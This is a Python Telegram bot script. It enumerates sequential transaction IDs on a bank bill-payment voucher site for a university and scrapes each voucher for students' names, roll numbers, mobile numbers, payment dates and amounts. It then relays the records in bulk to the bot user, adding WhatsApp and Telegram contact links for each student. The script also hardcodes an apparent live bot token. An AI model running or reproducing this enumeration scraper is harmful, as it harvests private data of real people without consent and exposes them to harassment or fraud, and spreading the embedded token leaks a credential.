import asyncio
import requests
from bs4 import BeautifulSoup
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, MessageHandler, CallbackQueryHandler, filters, ContextTypes

TOKEN = "8773704187:AAGTsdTedZNUuBYaKsrNUHE1DLt7sjakHJg"

user_stop_event = {}
user_search_active = {}
last_range = {}

# ----------------- DATA FETCH -----------------
def get_data(tran_id):
    url = f"https://billpay.sonalibank.com.bd/DhakaCentralUniversity/Home/Voucher/{tran_id}"
    headers = {"User-Agent": "Mozilla/5.0"}

    try:
        res = requests.get(url, headers=headers, timeout=10)

        if res.status_code != 200:
            return None, None

        soup = BeautifulSoup(res.text, "html.parser")
        lines = [l.strip() for l in soup.get_text("\n").split("\n") if l.strip()]

        def find(label):
            for i in range(len(lines)):
                if label in lines[i]:
                    return lines[i+1]
            return "N/A"

        name = find("Name")
        roll = find("Roll")
        mobile = find("Mobile")
        date = find("Date")
        amount = find("Amount")

        text = f"<pre>\nName   : {name}\nRoll   : {roll}\nMobile : {mobile}\nDate   : {date}\nAmount : {amount}\nID     : {tran_id}\n</pre>"

        return text, mobile

    except Exception as e:
        print("Error:", e)
        return None, None

# ----------------- BUTTON -----------------
def stop_button():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Stop", callback_data="stop")]])

def next_button(num):
    return InlineKeyboardMarkup([[InlineKeyboardButton(f"➡️ Next {num}", callback_data="next")]])

def get_buttons(mobile):
    if not mobile or mobile == "N/A":
        return None

    n = mobile.replace("+","").replace(" ","")
    if n.startswith("01"):
        n = "880" + n[1:]

    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("📱 WhatsApp", url=f"https://wa.me/{n}"),
            InlineKeyboardButton("✈️ Telegram", url=f"https://t.me/+{n}")
        ]
    ])

# ----------------- SEARCH ENGINE -----------------
async def run_search(message, start, end):
    user_id = message.chat_id

    if user_search_active.get(user_id, False):
        await message.reply_text("⚠️ Already running!")
        return

    user_search_active[user_id] = True
    user_stop_event[user_id] = False

    total = end - start + 1
    count = 0

    status = await message.reply_text("⏳ Starting...", reply_markup=stop_button())

    try:
        for i, num in enumerate(range(start, end+1), 1):

            if user_stop_event.get(user_id):
                break

            tran_id = f"DC{num:07d}"

            data, mobile = get_data(tran_id)

            if data:
                count += 1
                try:
                    await status.delete()
                except:
                    pass

                await message.reply_text(
                    f"📄 Result {count}:\n{data}",
                    parse_mode="HTML",
                    reply_markup=get_buttons(mobile)
                )

                status = await message.reply_text(
                    f"⏳ Running...\n🔢 {tran_id}\n📊 Found: {count}\n✅ {i}/{total}",
                    reply_markup=stop_button()
                )

            if i % 5 == 0:
                try:
                    await status.edit_text(
                        f"⏳ Running...\n🔢 {tran_id}\n📊 Found: {count}\n✅ {i}/{total}",
                        reply_markup=stop_button()
                    )
                except:
                    pass

            # ⏱️ 2 SECOND SAFE DELAY
            for _ in range(20):
                if user_stop_event.get(user_id):
                    break
                await asyncio.sleep(0.1)

    finally:
        user_search_active[user_id] = False
        try:
            await status.delete()
        except:
            pass

        if user_stop_event.get(user_id):
            await message.reply_text(f"🛑 Stopped!\n📊 Found: {count}")
        else:
            await message.reply_text(f"✅ Done!\n📊 Total: {count}")
            await message.reply_text(f"👉 Next {total}?", reply_markup=next_button(total))

# ----------------- HANDLER -----------------
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    user_id = update.message.from_user.id

    if "-" in text:
        try:
            s, e = map(int, text.split("-"))
            if (e - s + 1) > 500:
                await update.message.reply_text("❌ Max 500 limit")
                return

            last_range[user_id] = (s, e)
            await run_search(update.message, s, e)

        except:
            await update.message.reply_text("❌ Format: 1000-1500")

    elif text.isdigit():
        num = int(text)
        tran_id = f"DC{num:07d}"

        data, mobile = get_data(tran_id)

        if data:
            await update.message.reply_text(
                data,
                parse_mode="HTML",
                reply_markup=get_buttons(mobile)
            )
        else:
            await update.message.reply_text("❌ Not Found")

# ----------------- CALLBACK -----------------
async def handle_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id

    if query.data == "stop":
        user_stop_event[user_id] = True
        await query.answer("🛑 Stopping...")
        await query.edit_message_reply_markup(reply_markup=None)

    elif query.data == "next":
        await query.answer()
        s, e = last_range.get(user_id, (0, 0))
        diff = e - s + 1
        new_s, new_e = e + 1, e + diff
        last_range[user_id] = (new_s, new_e)

        await query.message.reply_text(f"🔄 Next: {new_s}-{new_e}")
        await run_search(query.message, new_s, new_e)

# ----------------- RUN -----------------
app = ApplicationBuilder().token(TOKEN).build()

app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
app.add_handler(CallbackQueryHandler(handle_query))

print("🤖 DCU BOT RUNNING...")
app.run_polling()
